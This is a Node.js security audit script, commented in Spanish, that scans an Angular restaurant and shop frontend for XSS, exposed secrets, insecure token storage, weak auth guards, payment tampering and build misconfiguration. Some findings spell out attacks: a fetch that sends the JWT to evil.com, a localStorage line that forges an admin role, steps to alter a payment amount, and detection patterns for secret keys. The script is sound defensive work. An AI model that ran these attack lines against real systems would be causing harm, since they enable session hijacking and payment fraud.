#!/usr/bin/env node
/**
 * ╔══════════════════════════════════════════════════════════════╗
 * ║    🔒 AUDITORÍA DE SEGURIDAD — ANGULAR FRONTEND              ║
 * ║    Análisis automático de vulnerabilidades                    ║
 * ╚══════════════════════════════════════════════════════════════╝
 *
 * Ejecutar: cd frontend/ProyectoSIO && node security-audit.js
 *
 * Analiza el código fuente del frontend Angular buscando:
 *   - XSS (Cross-Site Scripting)
 *   - Exposición de credenciales y API keys
 *   - Almacenamiento inseguro (localStorage)
 *   - Autenticación y guards
 *   - Configuración de seguridad HTTP
 *   - Dependencias vulnerables
 *   - Malas prácticas OWASP
 */

const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');

// ─── Colores ─────────────────────────────────────────────────
const c = {
  red:      (t) => `\x1b[31m${t}\x1b[0m`,
  green:    (t) => `\x1b[32m${t}\x1b[0m`,
  yellow:   (t) => `\x1b[33m${t}\x1b[0m`,
  cyan:     (t) => `\x1b[36m${t}\x1b[0m`,
  magenta:  (t) => `\x1b[35m${t}\x1b[0m`,
  bold:     (t) => `\x1b[1m${t}\x1b[0m`,
  dim:      (t) => `\x1b[2m${t}\x1b[0m`,
  bgRed:    (t) => `\x1b[41m\x1b[37m${t}\x1b[0m`,
  bgYellow: (t) => `\x1b[43m\x1b[30m${t}\x1b[0m`,
  bgGreen:  (t) => `\x1b[42m\x1b[30m${t}\x1b[0m`,
};

// ─── Contadores ──────────────────────────────────────────────
const stats = { critico: 0, alto: 0, medio: 0, bajo: 0, info: 0, ok: 0 };

function severity(level, msg) {
  const icons = {
    CRITICO: c.bgRed(' CRÍTICO '),
    ALTO:    c.red('  🔴 ALTO    '),
    MEDIO:   c.yellow('  🟡 MEDIO   '),
    BAJO:    c.cyan('  🔵 BAJO    '),
    INFO:    c.dim('  ℹ️  INFO    '),
    OK:      c.green('  ✅ OK      '),
  };
  const key = level.toLowerCase().replace('í', 'i');
  stats[key] = (stats[key] || 0) + 1;
  console.log(`${icons[level]} ${msg}`);
}

function header(title) {
  console.log('\n' + c.bold('═'.repeat(64)));
  console.log(c.bold(`  ${title}`));
  console.log(c.bold('═'.repeat(64)));
}

function subheader(title) {
  console.log(`\n  ${c.magenta('──')} ${c.bold(title)} ${c.magenta('─'.repeat(Math.max(0, 50 - title.length)))}`);
}

// ─── Utilidades ──────────────────────────────────────────────
const ROOT = __dirname;
const SRC = path.join(ROOT, 'src');

function readFile(relativePath) {
  try { return fs.readFileSync(path.join(ROOT, relativePath), 'utf-8'); }
  catch { return null; }
}

function fileExists(relativePath) {
  return fs.existsSync(path.join(ROOT, relativePath));
}

function findInFile(content, pattern) {
  if (!content) return [];
  const lines = content.split('\n');
  const results = [];
  for (let i = 0; i < lines.length; i++) {
    if (pattern.test(lines[i])) {
      results.push({ line: i + 1, text: lines[i].trim() });
    }
  }
  return results;
}

function collectFiles(dir, exts = ['.ts', '.html']) {
  let files = [];
  try {
    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
      const full = path.join(dir, entry.name);
      if (entry.isDirectory() && !['node_modules', 'dist', '.angular', '.git'].includes(entry.name)) {
        files = files.concat(collectFiles(full, exts));
      } else if (entry.isFile() && exts.some(e => entry.name.endsWith(e))) {
        files.push(full);
      }
    }
  } catch {}
  return files;
}

// ╔══════════════════════════════════════════════════════════════╗
// ║                   TESTS DE SEGURIDAD                         ║
// ╚══════════════════════════════════════════════════════════════╝

// ─────────────────────────────────────────────────────────────
// 1. CREDENCIALES Y API KEYS EXPUESTAS
// ─────────────────────────────────────────────────────────────
function testExposedSecrets() {
  header('1. CREDENCIALES Y API KEYS EXPUESTAS EN EL CÓDIGO');

  const envDev = readFile('src/environments/environment.ts');
  const envProd = readFile('src/environments/environment.prod.ts');

  // Stripe publishable key en el código
  if (envDev) {
    const stripeMatch = envDev.match(/stripePublishableKey:\s*'(pk_[^']+)'/);
    if (stripeMatch) {
      const key = stripeMatch[1];
      if (key.startsWith('pk_test_')) {
        severity('MEDIO',
          'Stripe TEST key hardcodeada en environment.ts\n' +
          `             🔑 ${key.substring(0, 20)}...${key.substring(key.length - 8)}\n` +
          '             💣 Aunque pk_test_ es pública, es mejor práctica usar variables de entorno.\n' +
          '             🛠️  FIX: Usar process.env o archivo .env para claves de API.'
        );
      }
      if (key.startsWith('pk_live_')) {
        severity('CRITICO',
          'Stripe LIVE key hardcodeada en environment.ts\n' +
          '             💣 La clave de producción NO debe estar en el código fuente.\n' +
          '             🛠️  FIX: Usar variables de entorno en el build de producción.'
        );
      }
    }
  }

  // Verificar si producción usa la misma key test
  if (envProd) {
    const stripeProd = envProd.match(/stripePublishableKey:\s*'(pk_[^']+)'/);
    if (stripeProd && stripeProd[1].startsWith('pk_test_')) {
      severity('ALTO',
        'environment.prod.ts usa Stripe TEST key en producción.\n' +
        '             📁 src/environments/environment.prod.ts\n' +
        '             💣 Los pagos en producción NO funcionarán con clave de pruebas.\n' +
        '             🛠️  FIX: Reemplazar con pk_live_... para producción.'
      );
    }
  }

  // Buscar credenciales hardcodeadas en TODO el código
  subheader('Credenciales en el código fuente');
  const allFiles = collectFiles(SRC);
  const secretPatterns = [
    { pattern: /['"]sk_(test|live)_[a-zA-Z0-9]+['"]/, name: 'Stripe SECRET key' },
    { pattern: /['"]pk_live_[a-zA-Z0-9]+['"]/, name: 'Stripe LIVE key' },
    { pattern: /password\s*[:=]\s*['"][^'"]{3,}['"](?!.*placeholder)/i, name: 'Contraseña hardcodeada' },
    { pattern: /api[_-]?key\s*[:=]\s*['"][^'"]{8,}['"]/i, name: 'API key hardcodeada' },
    { pattern: /secret\s*[:=]\s*['"][^'"]{8,}['"]/i, name: 'Secret hardcodeado' },
  ];

  for (const file of allFiles) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);
    for (const { pattern, name } of secretPatterns) {
      const matches = findInFile(content, pattern);
      for (const m of matches) {
        // Ignorar falsos positivos comunes
        if (m.text.includes('process.env') || m.text.includes('placeholder') ||
            m.text.includes('••••') || m.text.includes('type=') ||
            m.text.includes('autocomplete')) continue;
        severity('ALTO',
          `${name} encontrada en ${rel}:${m.line}\n` +
          `             ${m.text.substring(0, 80)}`
        );
      }
    }
  }

  // Credenciales de demo visibles en la UI
  const loginHtml = readFile('src/app/features/auth/login/login.html');
  if (loginHtml && (loginHtml.includes('admin123') || loginHtml.includes('admin@tienda'))) {
    severity('CRITICO',
      'Credenciales de administrador visibles en la página de login.\n' +
      '             📁 src/app/features/auth/login/login.html\n' +
      '             🔓 Cualquier visitante puede ver: admin@tienda.com / admin123\n' +
      '             💣 Un atacante entra directamente al panel de administración.\n' +
      '             🛠️  FIX: Eliminar el bloque <div class="demo-info"> del HTML.'
    );
  }

  // Información de contacto expuesta en config
  const siteConfig = readFile('src/app/config/site.config.ts');
  if (siteConfig) {
    const whatsappMatch = siteConfig.match(/whatsapp:\s*'(\d+)'/);
    if (whatsappMatch) {
      severity('BAJO',
        `Número de WhatsApp expuesto en código: ${whatsappMatch[1]}\n` +
        '             📁 src/app/config/site.config.ts\n' +
        '             💣 Puede usarse para spam o ingeniería social.\n' +
        '             🛠️  FIX: Considerar cargarlo desde una API protegida.'
      );
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 2. XSS (Cross-Site Scripting)
// ─────────────────────────────────────────────────────────────
function testXSS() {
  header('2. XSS (Cross-Site Scripting)');

  const allHtml = collectFiles(SRC, ['.html']);
  const allTs = collectFiles(SRC, ['.ts']);
  let xssFound = false;

  subheader('innerHTML y bypass de sanitización');
  for (const file of [...allHtml, ...allTs]) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    // innerHTML binding sin sanitizar
    const innerHTML = findInFile(content, /\[innerHTML\]/);
    for (const m of innerHTML) {
      xssFound = true;
      severity('ALTO',
        `[innerHTML] usado en ${rel}:${m.line}\n` +
        `             ${m.text.substring(0, 80)}\n` +
        '             💣 Si el contenido viene del usuario o la API, permite inyectar scripts.\n' +
        '             🛠️  FIX: Usar DomSanitizer o pipe de sanitización personalizado.'
      );
    }

    // bypassSecurityTrust* — desactiva la protección de Angular
    const bypass = findInFile(content, /bypassSecurityTrust(Html|Script|Style|Url|ResourceUrl)/);
    for (const m of bypass) {
      xssFound = true;
      severity('CRITICO',
        `Bypass de seguridad Angular en ${rel}:${m.line}\n` +
        `             ${m.text.substring(0, 80)}\n` +
        '             💣 Desactiva la protección XSS de Angular. Un atacante puede inyectar\n' +
        '                HTML/JS malicioso si el valor viene de fuente externa.\n' +
        '             🛠️  FIX: Evitar bypassSecurityTrust*. Sanitizar manualmente el contenido.'
      );
    }

    // document.write — inyección directa al DOM
    const docWrite = findInFile(content, /document\.write\s*\(/);
    for (const m of docWrite) {
      xssFound = true;
      severity('ALTO', `document.write() en ${rel}:${m.line} — inyección directa al DOM.`);
    }

    // eval() — ejecución de código arbitrario
    const evalUsage = findInFile(content, /\beval\s*\(/);
    for (const m of evalUsage) {
      severity('CRITICO', `eval() en ${rel}:${m.line} — permite ejecución de código arbitrario.`);
    }

    // new Function() — otro eval disfrazado
    const newFunc = findInFile(content, /new\s+Function\s*\(/);
    for (const m of newFunc) {
      severity('ALTO', `new Function() en ${rel}:${m.line} — equivalente a eval().`);
    }
  }

  if (!xssFound) {
    severity('OK', 'No se detectaron patrones comunes de XSS en templates Angular.');
  }

  // Verificar CSP en index.html
  subheader('Content Security Policy (CSP)');
  const indexHtml = readFile('src/index.html');
  if (indexHtml) {
    if (!indexHtml.includes('Content-Security-Policy')) {
      severity('ALTO',
        'No hay meta tag de Content-Security-Policy en index.html.\n' +
        '             📁 src/index.html\n' +
        '             💣 Sin CSP, scripts inyectados por XSS se ejecutan libremente.\n' +
        '             🛠️  FIX: Agregar en <head>:\n' +
        "                <meta http-equiv=\"Content-Security-Policy\"\n" +
        "                  content=\"default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';\">"
      );
    } else {
      severity('OK', 'CSP meta tag encontrado en index.html.');
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 3. ALMACENAMIENTO INSEGURO
// ─────────────────────────────────────────────────────────────
function testInsecureStorage() {
  header('3. ALMACENAMIENTO INSEGURO (localStorage / sessionStorage)');

  const allTs = collectFiles(SRC, ['.ts']);
  const storageIssues = [];

  // Qué datos se guardan en localStorage
  const sensitiveKeys = {
    'auth_token': { level: 'CRITICO', desc: 'Token JWT' },
    'auth_user': { level: 'ALTO', desc: 'Datos del usuario (rol, email)' },
    'shopping_cart': { level: 'BAJO', desc: 'Carrito de compras' },
  };

  const storageService = readFile('src/app/core/services/storage.service.ts');
  if (storageService) {
    // Verificar si hay encriptación
    if (!storageService.includes('encrypt') && !storageService.includes('crypto') && !storageService.includes('CryptoJS')) {
      severity('ALTO',
        'StorageService guarda datos en localStorage SIN encriptar.\n' +
        '             📁 src/app/core/services/storage.service.ts\n' +
        '             💣 Cualquier script XSS o extensión del navegador puede leer:\n' +
        '                - Token JWT → suplantar la sesión del usuario\n' +
        '                - Datos del usuario → rastrear al administrador\n' +
        '                - Carrito → no tan grave pero es privacidad\n' +
        '             🛠️  FIX: Considerar usar sessionStorage (se borra al cerrar pestaña)\n' +
        '                o encriptar datos sensibles antes de guardarlos.'
      );
    }
  }

  // Buscar uso directo de localStorage
  for (const file of allTs) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    // Token en localStorage (el problema más grave)
    if (content.includes("localStorage.setItem") && content.includes('token')) {
      storageIssues.push(rel);
    }
  }

  const authService = readFile('src/app/core/services/auth.service.ts');
  if (authService) {
    if (authService.includes("TOKEN_KEY = 'auth_token'") && authService.includes('localStorage') || authService.includes('storageService')) {
      severity('CRITICO',
        'Token JWT almacenado en localStorage.\n' +
        '             📁 src/app/core/services/auth.service.ts\n' +
        '             🔓 localStorage es accesible por CUALQUIER JavaScript en la página.\n' +
        '             💣 Vector de ataque:\n' +
        '                1. Atacante encuentra un XSS (ej: campo de chat sin sanitizar)\n' +
        '                2. Ejecuta: fetch("https://evil.com/?token=" + localStorage.getItem("auth_token"))\n' +
        '                3. Ahora tiene la sesión del admin → control total del sistema\n' +
        '             🛠️  FIX: Guardar el JWT en una cookie HttpOnly (no accesible por JS).\n' +
        '                El backend debe enviar: Set-Cookie: token=xxx; HttpOnly; Secure; SameSite=Strict'
      );
    }
  }

  // Verificar si el cart guarda datos sin sanitizar
  const cartService = readFile('src/app/core/services/cart.service.ts');
  if (cartService && cartService.includes('JSON.parse') && !cartService.includes('try') === false) {
    severity('MEDIO',
      'Cart service hace JSON.parse de localStorage sin manejo de errores robusto.\n' +
      '             📁 src/app/core/services/cart.service.ts\n' +
      '             💣 Si un atacante modifica el localStorage, puede crashear la app.'
    );
  }
}

// ─────────────────────────────────────────────────────────────
// 4. AUTENTICACIÓN Y AUTORIZACIÓN
// ─────────────────────────────────────────────────────────────
function testAuthSecurity() {
  header('4. AUTENTICACIÓN Y AUTORIZACIÓN');

  subheader('Guards de ruta');
  const routes = readFile('src/app/app.routes.ts');
  const authGuard = readFile('src/app/core/guards/auth.guard.ts');
  const adminGuard = readFile('src/app/core/guards/admin.guard.ts');

  if (routes) {
    // Verificar rutas admin protegidas
    if (routes.includes("'admin'") && routes.includes('adminGuard')) {
      severity('OK', 'Ruta /admin protegida con adminGuard.');
    } else if (routes.includes("'admin'") && !routes.includes('Guard')) {
      severity('CRITICO', 'Ruta /admin NO tiene guard de protección.');
    }

    // Verificar ruta mesa (pública por diseño)
    if (routes.includes("'mesa/:mesaId'") && !routes.includes('canActivate')) {
      severity('INFO', 'Ruta /mesa/:mesaId es pública (por diseño, acceso por QR).');
    }
  }

  // Verificar que el guard valida correctamente
  if (authGuard) {
    if (authGuard.includes('isAuthenticated()')) {
      severity('OK', 'authGuard verifica isAuthenticated().');
    }
    // Pero la verificación es solo client-side
    severity('MEDIO',
      'La autenticación se verifica solo en el cliente (guard + signal).\n' +
      '             📁 src/app/core/guards/auth.guard.ts\n' +
      '             💣 Un atacante puede manipular localStorage para inyectar un user fake:\n' +
      '                localStorage.setItem("auth_user", JSON.stringify({role:"admin"}))\n' +
      '                y navegar a /admin — el guard lo deja pasar.\n' +
      '             🛠️  FIX: El guard debe validar el token contra el backend (GET /api/auth/profile)\n' +
      '                antes de dar acceso a rutas protegidas.'
    );
  }

  if (adminGuard) {
    if (adminGuard.includes('UserRole.ADMIN') || adminGuard.includes("role === 'admin'")) {
      severity('OK', 'adminGuard verifica rol de administrador.');
    }
  }

  // JWT token sin validar expiración en el cliente
  subheader('Manejo de tokens');
  const authService = readFile('src/app/core/services/auth.service.ts');
  if (authService) {
    if (!authService.includes('isTokenExpired') && !authService.includes('jwt_decode') && !authService.includes('jwtDecode')) {
      severity('ALTO',
        'No se verifica la expiración del token JWT en el cliente.\n' +
        '             📁 src/app/core/services/auth.service.ts\n' +
        '             💣 Un token expirado sigue usándose hasta que el backend lo rechaza.\n' +
        '                El usuario ve la app como si estuviera autenticado pero las\n' +
        '                peticiones fallan → mala experiencia + posible pérdida de datos.\n' +
        '             🛠️  FIX: Decodificar el JWT y verificar exp antes de cada petición.\n' +
        '                Redirigir a login si está expirado.'
      );
    }

    // Verificar logout limpia todo
    if (authService.includes('logout') && authService.includes('removeItem')) {
      severity('OK', 'logout() limpia datos de localStorage.');
    } else {
      severity('ALTO', 'logout() puede no estar limpiando todos los datos de sesión.');
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 5. INTERCEPTORES HTTP
// ─────────────────────────────────────────────────────────────
function testHttpSecurity() {
  header('5. SEGURIDAD HTTP (Interceptores)');

  const authInterceptor = readFile('src/app/core/interceptors/auth.interceptor.ts');
  const errorInterceptor = readFile('src/app/core/interceptors/http-error.interceptor.ts');
  const appConfig = readFile('src/app/app.config.ts');

  // Verificar que los interceptores están registrados
  if (appConfig) {
    if (appConfig.includes('authInterceptor') && appConfig.includes('httpErrorInterceptor')) {
      severity('OK', 'Ambos interceptores (auth + error) registrados en app.config.ts.');
    } else if (!appConfig.includes('authInterceptor')) {
      severity('CRITICO', 'authInterceptor NO está registrado — las peticiones van sin token.');
    }
  }

  // Verificar que el interceptor envía token
  if (authInterceptor) {
    if (authInterceptor.includes('Authorization') && authInterceptor.includes('Bearer')) {
      severity('OK', 'Auth interceptor envía token como Bearer en header Authorization.');
    }

    // Verificar si envía token a CUALQUIER dominio
    if (!authInterceptor.includes('apiUrl') && !authInterceptor.includes('localhost') &&
        !authInterceptor.includes('startsWith') && !authInterceptor.includes('includes')) {
      severity('ALTO',
        'Auth interceptor envía el JWT a TODAS las peticiones HTTP sin filtrar dominio.\n' +
        '             📁 src/app/core/interceptors/auth.interceptor.ts\n' +
        '             💣 Si haces peticiones a APIs externas (CDN, analytics, Stripe),\n' +
        '                tu token JWT se envía a esos servidores externos.\n' +
        '             🛠️  FIX: Verificar que la URL destino es tu API antes de agregar token:\n' +
        "                if (req.url.startsWith(environment.apiUrl)) { ... }"
      );
    }
  }

  // Verificar manejo de 401
  if (errorInterceptor) {
    if (!errorInterceptor.includes('401') && !errorInterceptor.includes('logout') &&
        !errorInterceptor.includes('login')) {
      severity('ALTO',
        'Error interceptor NO maneja respuestas 401 (no autorizado).\n' +
        '             📁 src/app/core/interceptors/http-error.interceptor.ts\n' +
        '             💣 Si el token expira, el usuario ve errores genéricos en vez de\n' +
        '                ser redirigido al login.\n' +
        '             🛠️  FIX: Detectar status 401 → limpiar sesión → redirigir a /login.'
      );
    }

    // Verificar si se logea información sensible
    if (errorInterceptor.includes('console.error(errorMessage)') || errorInterceptor.includes('console.error(error)')) {
      severity('MEDIO',
        'Error interceptor logea errores HTTP en la consola.\n' +
        '             📁 src/app/core/interceptors/http-error.interceptor.ts\n' +
        '             💣 En producción, usuarios pueden ver errores con info interna\n' +
        '                abriendo las DevTools del navegador.\n' +
        '             🛠️  FIX: Desactivar logs detallados en producción:\n' +
        '                if (!environment.production) console.error(...);\n'
      );
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 6. SEGURIDAD EN PAGOS
// ─────────────────────────────────────────────────────────────
function testPaymentSecurity() {
  header('6. SEGURIDAD EN PAGOS (Stripe / Wompi)');

  const stripe = readFile('src/app/core/services/stripe.service.ts');
  const wompi = readFile('src/app/core/services/wompi.service.ts');

  if (stripe) {
    subheader('Stripe');

    // Verificar que el monto se calcula en el frontend
    if (stripe.includes('amount') && stripe.includes('post')) {
      severity('ALTO',
        'El monto del pago se envía desde el frontend al backend.\n' +
        '             📁 src/app/core/services/stripe.service.ts\n' +
        '             💣 Un atacante puede modificar el monto con DevTools:\n' +
        '                1. Abre Network → encuentra la petición create-intent\n' +
        '                2. Edita amount: 100 → amount: 1\n' +
        '                3. Paga $1 por un pedido de $100.000\n' +
        '             🛠️  FIX: El backend debe calcular el total desde los items del pedido.\n' +
        '                Nunca confiar en el amount que envía el frontend.'
      );
    }

    // Verificar que no guarda datos de tarjeta
    if (!stripe.includes('cardNumber') && !stripe.includes('card_number') && !stripe.includes('cvv')) {
      severity('OK', 'Stripe service no almacena datos de tarjeta (usa Stripe Elements). ✓');
    }
  }

  if (wompi) {
    subheader('Wompi');

    // Script externo cargado dinámicamente
    if (wompi.includes("document.createElement('script')") && wompi.includes('checkout.wompi.co')) {
      severity('MEDIO',
        'Script de Wompi se carga dinámicamente desde CDN externo.\n' +
        '             📁 src/app/core/services/wompi.service.ts\n' +
        '             💣 Si el CDN de Wompi se compromete, tu sitio ejecuta código malicioso.\n' +
        '             🛠️  FIX: Agregar integridad (SRI) al script:\n' +
        '                script.integrity = "sha384-..."; script.crossOrigin = "anonymous";'
      );
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 7. VALIDACIÓN DE FORMULARIOS
// ─────────────────────────────────────────────────────────────
function testFormsSecurity() {
  header('7. VALIDACIÓN DE FORMULARIOS');

  const allHtml = collectFiles(SRC, ['.html']);
  const allTs = collectFiles(SRC, ['.ts']);

  let formsWithoutValidation = 0;
  let hasReactiveFormsUsage = false;

  for (const file of allHtml) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    // Formularios sin validación
    const forms = findInFile(content, /<form[\s>]/);
    for (const form of forms) {
      const formBlock = content.substring(
        content.indexOf(form.text),
        content.indexOf('</form>', content.indexOf(form.text)) + 7
      );
      if (!formBlock.includes('required') && !formBlock.includes('Validators') &&
          !formBlock.includes('formControl') && !formBlock.includes('ngModel')) {
        formsWithoutValidation++;
        severity('MEDIO', `Formulario sin validación en ${rel}:${form.line}`);
      }
    }
  }

  // Verificar si usan ReactiveFormsModule o solo template-driven
  for (const file of allTs) {
    const content = fs.readFileSync(file, 'utf-8');
    if (content.includes('ReactiveFormsModule') || content.includes('FormBuilder') || content.includes('FormGroup')) {
      hasReactiveFormsUsage = true;
      break;
    }
  }

  if (!hasReactiveFormsUsage) {
    severity('MEDIO',
      'No se detectó uso de Reactive Forms (FormBuilder/FormGroup).\n' +
      '             💣 Template-driven forms (FormsModule) son más difíciles de validar\n' +
      '                de forma consistente y programática.\n' +
      '             🛠️  FIX: Considerar migrar formularios críticos (login, pagos) a Reactive Forms\n' +
      '                para validación más robusta.'
    );
  }

  // Verificar login form
  const loginTs = readFile('src/app/features/auth/login/login.ts');
  if (loginTs) {
    if (!loginTs.includes('Validators') && !loginTs.includes('minLength') && !loginTs.includes('pattern')) {
      severity('MEDIO',
        'Formulario de login sin validadores programáticos.\n' +
        '             📁 src/app/features/auth/login/login.ts\n' +
        '             💣 No se valida longitud mínima de contraseña ni formato de email.\n' +
        '             🛠️  FIX: Agregar Validators: email, required, minLength(6).'
      );
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 8. SCRIPTS EXTERNOS Y THIRD-PARTY
// ─────────────────────────────────────────────────────────────
function testExternalScripts() {
  header('8. SCRIPTS EXTERNOS Y DEPENDENCIAS DE TERCEROS');

  const indexHtml = readFile('src/index.html');
  const allHtml = collectFiles(SRC, ['.html']);
  const allTs = collectFiles(SRC, ['.ts']);

  // Scripts en index.html
  if (indexHtml) {
    const scripts = findInFile(indexHtml, /<script\s+src/);
    for (const s of scripts) {
      if (s.text.includes('http') && !s.text.includes('integrity')) {
        severity('MEDIO',
          `Script externo sin SRI en index.html:${s.line}\n` +
          `             ${s.text}\n` +
          '             💣 Sin Subresource Integrity, un CDN comprometido = tu sitio comprometido.\n' +
          '             🛠️  FIX: Agregar integrity="sha384-..." crossorigin="anonymous"'
        );
      }
    }
  }

  // Scripts cargados dinámicamente en TypeScript
  for (const file of allTs) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    const dynamicScripts = findInFile(content, /document\.createElement\s*\(\s*['"]script['"]\s*\)/);
    for (const m of dynamicScripts) {
      severity('MEDIO',
        `Script cargado dinámicamente en ${rel}:${m.line}\n` +
        '             💣 Los scripts dinámicos son difíciles de auditar y pueden ser manipulados.\n' +
        '             🛠️  FIX: Verificar integridad del script y que la URL sea de un CDN confiable.'
      );
    }
  }

  // Verificar dependencias npm
  subheader('npm audit (vulnerabilidades conocidas)');
  try {
    const auditResult = execSync('npm audit --json 2>&1', { cwd: ROOT, encoding: 'utf-8', timeout: 30000 });
    const audit = JSON.parse(auditResult);
    const vulns = audit.metadata?.vulnerabilities || {};
    if (vulns.critical > 0) severity('CRITICO', `npm audit: ${vulns.critical} vulnerabilidad(es) CRÍTICAS.`);
    if (vulns.high > 0) severity('ALTO', `npm audit: ${vulns.high} vulnerabilidad(es) ALTAS.`);
    if (vulns.moderate > 0) severity('MEDIO', `npm audit: ${vulns.moderate} vulnerabilidad(es) MODERADAS.`);
    if (vulns.low > 0) severity('BAJO', `npm audit: ${vulns.low} vulnerabilidad(es) BAJAS.`);
    const total = (vulns.critical || 0) + (vulns.high || 0) + (vulns.moderate || 0) + (vulns.low || 0);
    if (total === 0) severity('OK', 'npm audit: Ninguna vulnerabilidad conocida en dependencias. ✓');
  } catch (err) {
    try {
      const data = JSON.parse(err.stdout || '{}');
      const vulns = data.metadata?.vulnerabilities || {};
      if (vulns.critical > 0) severity('CRITICO', `npm audit: ${vulns.critical} CRÍTICAS.`);
      if (vulns.high > 0) severity('ALTO', `npm audit: ${vulns.high} ALTAS.`);
      if (vulns.moderate > 0) severity('MEDIO', `npm audit: ${vulns.moderate} MODERADAS.`);
      if (vulns.low > 0) severity('BAJO', `npm audit: ${vulns.low} BAJAS.`);
    } catch {
      severity('INFO', 'No se pudo ejecutar npm audit. Ejecutar manualmente: npm audit');
    }
  }
}

// ─────────────────────────────────────────────────────────────
// 9. CONFIGURACIÓN DE BUILD ANGULAR
// ─────────────────────────────────────────────────────────────
function testBuildConfig() {
  header('9. CONFIGURACIÓN DE BUILD Y PRODUCCIÓN');

  const angularJson = readFile('angular.json');
  const envProd = readFile('src/environments/environment.prod.ts');
  const envDev = readFile('src/environments/environment.ts');

  if (angularJson) {
    // sourceMaps en producción
    if (angularJson.includes('"sourceMap": true') || angularJson.includes('"sourceMap":true')) {
      // Verificar si es en producción
      const prodSection = angularJson.substring(angularJson.indexOf('"production"'));
      if (prodSection && prodSection.substring(0, 500).includes('"sourceMap": true')) {
        severity('ALTO',
          'Source maps habilitados en build de producción.\n' +
          '             📁 angular.json → production\n' +
          '             💣 Los source maps exponen TODO el código TypeScript original.\n' +
          '                Un atacante puede leer tu lógica de negocio, guards, servicios...\n' +
          '             🛠️  FIX: En production config: "sourceMap": false'
        );
      }
    }

    // budget de bundle
    if (angularJson.includes('"maximumError": "1MB"') || angularJson.includes('"maximumError": "1mb"')) {
      severity('OK', 'Budget de bundle configurado (max 1MB). ✓');
    }

    // outputHashing
    if (angularJson.includes('"outputHashing": "all"')) {
      severity('OK', 'Output hashing habilitado (cache busting). ✓');
    }
  }

  // Verificar que producción tiene diferente apiUrl
  if (envDev && envProd) {
    const devUrl = envDev.match(/apiUrl:\s*'([^']+)'/);
    const prodUrl = envProd.match(/apiUrl:\s*'([^']+)'/);

    if (devUrl && prodUrl) {
      if (devUrl[1] === prodUrl[1]) {
        severity('ALTO',
          'apiUrl de desarrollo y producción son IGUALES.\n' +
          '             💣 La app de producción apunta al servidor de desarrollo.'
        );
      } else if (prodUrl[1].startsWith('http://')) {
        severity('ALTO',
          `apiUrl de producción usa HTTP (no HTTPS): ${prodUrl[1]}\n` +
          '             📁 src/environments/environment.prod.ts\n' +
          '             💣 Los datos (tokens, passwords, pagos) viajan sin cifrar.\n' +
          '             🛠️  FIX: Cambiar a https://...'
        );
      } else if (prodUrl[1].startsWith('https://')) {
        severity('OK', 'apiUrl de producción usa HTTPS. ✓');
      }
    }
  }

  // Debug habilitado en producción
  if (envProd && envProd.includes('enableDebug: true')) {
    severity('ALTO',
      'Debug habilitado en environment.prod.ts.\n' +
      '             💣 Información de debug visible para usuarios en producción.\n' +
      '             🛠️  FIX: enableDebug: false en producción.'
    );
  } else if (envProd && envProd.includes('enableDebug: false')) {
    severity('OK', 'Debug desactivado en producción. ✓');
  }
}

// ─────────────────────────────────────────────────────────────
// 10. PRIVACIDAD Y DATOS PERSONALES
// ─────────────────────────────────────────────────────────────
function testPrivacy() {
  header('10. PRIVACIDAD Y DATOS PERSONALES');

  const allTs = collectFiles(SRC, ['.ts']);

  // Verificar si hay consentimiento de cookies
  const cookieService = readFile('src/app/core/services/cookie.service.ts');
  if (cookieService) {
    if (cookieService.includes('consent') || cookieService.includes('GDPR') || cookieService.includes('acceptCookies')) {
      severity('OK', 'Servicio de cookies incluye lógica de consentimiento.');
    } else {
      severity('MEDIO',
        'CookieService no tiene gestión de consentimiento del usuario.\n' +
        '             📁 src/app/core/services/cookie.service.ts\n' +
        '             💣 Regulaciones (GDPR, Ley 1581 Colombia) exigen consentimiento\n' +
        '                antes de almacenar cookies no esenciales.\n' +
        '             🛠️  FIX: Agregar banner de cookies con aceptar/rechazar.'
      );
    }
  }

  // WhatsApp service con datos del cliente
  const whatsapp = readFile('src/app/core/services/whatsapp.service.ts');
  if (whatsapp && whatsapp.includes('window.open') && whatsapp.includes('wa.me')) {
    severity('BAJO',
      'WhatsApp service envía datos del pedido a través de URL de WhatsApp.\n' +
      '             📁 src/app/core/services/whatsapp.service.ts\n' +
      '             💣 Nombre, teléfono y dirección del cliente van en la URL.\n' +
      '                Estas URLs pueden quedar en el historial del navegador.'
    );
  }

  // console.log en servicios (info leaks en producción)
  subheader('console.log en producción');
  let consoleLogCount = 0;
  for (const file of allTs) {
    const content = fs.readFileSync(file, 'utf-8');
    const rel = path.relative(ROOT, file);

    const logs = findInFile(content, /console\.(log|warn|debug)\s*\(/);
    if (logs.length > 0 && !rel.includes('security-audit')) {
      consoleLogCount += logs.length;
    }
  }
  if (consoleLogCount > 10) {
    severity('MEDIO',
      `${consoleLogCount} llamadas a console.log/warn/debug en el código fuente.\n` +
      '             💣 En producción, cualquier usuario puede abrir DevTools y ver\n' +
      '                información interna: errores, datos de API, flujo de la app.\n' +
      '             🛠️  FIX: Envolver en: if (!environment.production) console.log(...)\n' +
      '                O usar un servicio de logging que se desactive en producción.'
    );
  } else if (consoleLogCount > 0) {
    severity('BAJO', `${consoleLogCount} console.log encontrados (revisarlos antes de producción).`);
  } else {
    severity('OK', 'No se encontraron console.log en el código. ✓');
  }
}

// ─────────────────────────────────────────────────────────────
// 11. ARCHIVOS DUPLICADOS Y CÓDIGO MUERTO
// ─────────────────────────────────────────────────────────────
function testCodeHygiene() {
  header('11. HIGIENE DE CÓDIGO');

  // Servicios duplicados
  const chatService = readFile('src/app/core/services/chat.service.ts');
  const servicioChat = readFile('src/app/core/services/servicio-chat.ts');
  if (chatService && servicioChat) {
    severity('MEDIO',
      'Dos servicios de chat duplicados: chat.service.ts y servicio-chat.ts\n' +
      '             📁 src/app/core/services/\n' +
